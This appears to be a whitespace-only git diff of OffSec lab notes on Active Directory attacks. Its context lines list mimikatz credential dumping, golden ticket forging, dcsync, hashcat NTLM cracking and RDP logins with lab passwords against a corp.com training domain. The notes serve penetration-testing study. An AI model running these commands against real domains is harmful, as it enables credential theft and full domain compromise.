@@ -4675,22 +4675,22 @@ offsec:lab (admin)
     mimikatz # privilege::debug
     mimikatz # lsadump::lsa /patch
     ```
-  - Move back to client74 as **jen**  
+  - Move back to client74 as **jen**    
     `xfreerdp3 /u:jen /d:corp.com /p:Nexus123! /v:192.168.127.74 /cert:ignore /drive:share,/home/kali/share`  
-  - Purge existing Kerberos tickets  
+  - Purge existing Kerberos tickets    
     `mimikatz # kerberos::purge`
-  - Create a forged TGT (Golden Ticket)
+  - Create a forged TGT (Golden Ticket)  
     `mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt`  
   - Access resources across the domain (Golden Tickets don’t expire until krbtgt password is reset)  
     `C:\Tools\SysinternalsSuite>.\PsExec.exe \\dc1 cmd.exe`  
 - dcsync to DC1
-  - RDP to DC1 as jeffadmin
+  - RDP to DC1 as jeffadmin  
     `xfreerdp3 /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.127.70 /cert:ignore /drive:share,/home/kali/share`  
-  - perform a dcsync attack to obtain the credentials of Administrator
+  - perform a dcsync attack to obtain the credentials of Administrator  
     `mimikatz # lsadump::dcsync /user:corp\Administrator`  
-  - Crack the NTLM hash
+  - Crack the NTLM hash  
     `kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
-  - gain access to DC1 from the cracked credential
+  - gain access to DC1 from the cracked credential  
     `rdesktop -u Administrator  -p lab -d corp.com -g 1280x860 -r disk:share=/home/kali/share 192.168.127.70`  
 
 ## Penetration testing report 
